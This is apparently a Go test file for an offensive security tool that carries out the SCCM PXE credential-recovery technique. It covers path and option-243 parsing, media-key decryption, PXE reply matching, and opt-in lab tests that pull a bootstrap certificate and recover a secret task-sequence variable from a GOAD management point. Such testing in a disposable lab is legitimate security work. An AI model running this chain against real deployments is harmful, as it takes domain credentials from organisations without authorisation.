package cred1

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"net/netip"
	"os"
	"strings"
	"testing"
	"time"
)

func testPXEPayload(xid [4]byte) []byte {
	p := make([]byte, bootpHeaderBytes+dhcpCookieBytes)
	p[0], p[1], p[2] = 2, 1, 6
	copy(p[4:8], xid[:])
	copy(p[bootpHeaderBytes:], dhcpMagicCookie[:])
	return p
}

func TestPXEBootstrapPathAndEnvelopeBounds(t *testing.T) {
	for _, path := range []string{`\SMSTemp\2026.08.09.0001.{A1B2C3D4}.boot.var`, `\SMSTemp\x.boot.bcd`} {
		suffix := ".boot.var"
		if strings.HasSuffix(path, ".boot.bcd") {
			suffix = ".boot.bcd"
		}
		if _, err := validateSMSTempPath(path, suffix); err != nil {
			t.Fatalf("valid path %q: %v", path, err)
		}
	}
	for _, path := range []string{`\SMSTemp\..\x.boot.var`, `\Other\x.boot.var`, `\\server\x.boot.var`, `\SMSTemp\x.boot.wim`, "\x00"} {
		if _, err := validateSMSTempPath(path, ".boot.var"); err == nil {
			t.Fatalf("unsafe path accepted: %q", path)
		}
	}
	static := []byte{0x9f, 0x67, 0x9c, 0x9b, 0x37, 0x3a, 0x1f, 0x48, 0x82, 0x4f, 0x37, 0x87, 0x33, 0xde, 0x24, 0xe9}
	plain := []byte{0x53, 0xfd, 0xf1, 0xbd, 0x75, 0x8c, 0x42, 0x1c, 0x0a, 0xa1, 0, 0, 0, 0, 0, 0}
	b, _ := aes.NewCipher(MediaKey(static)[:aes.BlockSize])
	encrypted := make([]byte, aes.BlockSize)
	cipher.NewCBCEncrypter(b, make([]byte, aes.BlockSize)).CryptBlocks(encrypted, plain)
	envelope := append([]byte{48}, make([]byte, 20)...)
	envelope = append(envelope, encrypted...)
	envelope = append(envelope, make([]byte, 12)...)
	path := `\SMSTemp\fresh.boot.var`
	option := append([]byte{2, byte(len(envelope))}, envelope...)
	option = append(option, 0, byte(len(path)))
	option = append(option, []byte(path)...)
	gotPath, key, err := parseOption243(option)
	if err != nil || gotPath != path || len(key) != 40 {
		t.Fatalf("option243: path=%q key=%d err=%v", gotPath, len(key), err)
	}
	if _, _, err := parseOption243(option[:4]); err == nil {
		t.Fatal("truncated option 243 accepted")
	}
}

func validPXEFrame(xid [4]byte) pxeFrame {
	return pxeFrame{
		sourceIP: netip.MustParseAddr("10.1.10.41"), destinationIP: broadcastIPv4,
		sourcePort: pxeProxyDHCPPort, destinationPort: pxeClientPort, udpChecksum: 0xbeef,
		payload: testPXEPayload(xid),
	}
}

func TestNewPXERequestIsBoundedAndCorrelatable(t *testing.T) {
	xid, request, err := newPXERequest(netip.MustParseAddr("10.1.10.99"), []byte{0, 1, 2, 3, 4, 5})
	if err != nil {
		t.Fatal(err)
	}
	if len(request) < bootpHeaderBytes+dhcpCookieBytes || len(request) > maxPXEPayloadBytes {
		t.Fatalf("invalid request size %d", len(request))
	}
	if binary.BigEndian.Uint32(request[4:8]) != binary.BigEndian.Uint32(xid[:]) {
		t.Fatal("request does not carry transaction ID")
	}
	if request[0] != 1 || request[1] != 1 || request[2] != 6 {
		t.Fatal("unexpected BOOTP request header")
	}
	if string(request[bootpHeaderBytes:bootpHeaderBytes+dhcpCookieBytes]) != string(dhcpMagicCookie[:]) {
		t.Fatal("request has no DHCP cookie")
	}
}

func TestMatchPXEReplyStrictCorrelation(t *testing.T) {
	xid := [4]byte{1, 2, 3, 4}
	client := netip.MustParseAddr("10.1.10.99")
	if got, err := matchPXEReply(validPXEFrame(xid), netip.MustParseAddr("10.1.10.41"), client, xid); err != nil || got.UDPChecksum != 0xbeef {
		t.Fatalf("valid invalid-checksum PXE reply rejected: %#v %v", got, err)
	}
	unicast := validPXEFrame(xid)
	unicast.destinationIP = client
	if _, err := matchPXEReply(unicast, netip.MustParseAddr("10.1.10.41"), client, xid); err != nil {
		t.Fatalf("valid client-addressed PXE reply rejected: %v", err)
	}
	for name, mutate := range map[string]func(*pxeFrame){
		"wrong transaction":    func(f *pxeFrame) { f.payload[7]++ },
		"wrong DP":             func(f *pxeFrame) { f.sourceIP = netip.MustParseAddr("10.1.10.42") },
		"wrong source port":    func(f *pxeFrame) { f.sourcePort = 67 },
		"wrong destination":    func(f *pxeFrame) { f.destinationPort = 67 },
		"wrong destination IP": func(f *pxeFrame) { f.destinationIP = netip.MustParseAddr("10.1.10.42") },
		"truncated BOOTP":      func(f *pxeFrame) { f.payload = f.payload[:bootpHeaderBytes] },
		"non BOOTREPLY":        func(f *pxeFrame) { f.payload[0] = 1 },
		"oversized":            func(f *pxeFrame) { f.payload = make([]byte, maxPXEPayloadBytes+1) },
	} {
		t.Run(name, func(t *testing.T) {
			f := validPXEFrame(xid)
			mutate(&f)
			if _, err := matchPXEReply(f, netip.MustParseAddr("10.1.10.41"), client, xid); err == nil {
				t.Fatal("accepted unrelated or malformed PXE reply")
			}
		})
	}
}

// TestGOADPXETransport is opt-in and sends exactly one PXE request to the
// explicitly named disposable GOAD DP. It intentionally stops before parsing
// any returned PXE options.
func TestGOADPXETransport(t *testing.T) {
	if os.Getenv("CINDERPATH_CRED1_GOAD_PXE") != "yes" {
		t.Skip("GOAD PXE transport test not enabled")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	reply, err := AcquirePXEReply(ctx, "eth0", netip.MustParseAddr("10.1.10.41"), 10*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if reply.SourceIP != netip.MustParseAddr("10.1.10.41") || (reply.DestinationIP != broadcastIPv4 && reply.DestinationIP != netip.MustParseAddr("10.1.10.99")) ||
		reply.SourcePort != pxeProxyDHCPPort || reply.DestinationPort != pxeClientPort || len(reply.Payload) == 0 {
		t.Fatalf("unexpected GOAD PXE reply: %#v", reply)
	}
}

// TestGOADPXEBootstrap is opt-in and uses only fresh PXE output. It does not
// contact the management point or parse task-sequence policy.
func TestGOADPXEBootstrap(t *testing.T) {
	if os.Getenv("CINDERPATH_CRED1_GOAD_PXE") != "yes" {
		t.Skip("GOAD PXE bootstrap test not enabled")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	identity, err := AcquireBootstrap(ctx, "eth0", netip.MustParseAddr("10.1.10.41"))
	if err != nil {
		t.Fatal(err)
	}
	if identity.SiteCode != "P01" || identity.ManagementPoint == "" || identity.PFXHex == "" {
		t.Fatalf("invalid fresh bootstrap metadata: %+v", identity)
	}
}

// TestGOADPXEToPolicyPath proves the product-owned fresh PXE bootstrap hands
// directly to the bounded policy core. The expected secret value is never an
// input; only its variable name is supplied by the lab harness.
func TestGOADPXEToPolicyPath(t *testing.T) {
	if os.Getenv("CINDERPATH_CRED1_GOAD_PXE") != "yes" {
		t.Skip("GOAD CRED-1 test not enabled")
	}
	variable := os.Getenv("CINDERPATH_CRED1_GOAD_VARIABLE")
	if variable == "" {
		t.Fatal("GOAD variable name is required")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	identity, err := AcquireBootstrap(ctx, "eth0", netip.MustParseAddr("10.1.10.41"))
	if err != nil {
		t.Fatal(err)
	}
	// The PXE-derived MP hostname is retained as evidence. This GOAD run uses
	// the explicitly selected DP/MP address because Kali's stale local DNS maps
	// MECM.sccm.lab to the DC; Host preserves the observed HTTP authority.
	result, err := (MPClient{BaseURL: "http://10.1.10.41", Host: "MECM.sccm.lab"}).ExecutePolicyPath(identity, time.Now())
	if err != nil {
		t.Fatal(err)
	}
	for _, sequence := range result.TaskSequences {
		for _, recovered := range sequence.Variables {
			if recovered.Name == variable && recovered.Value != "" {
				return
			}
		}
	}
	t.Fatalf("recovered variable %q not found", variable)
}
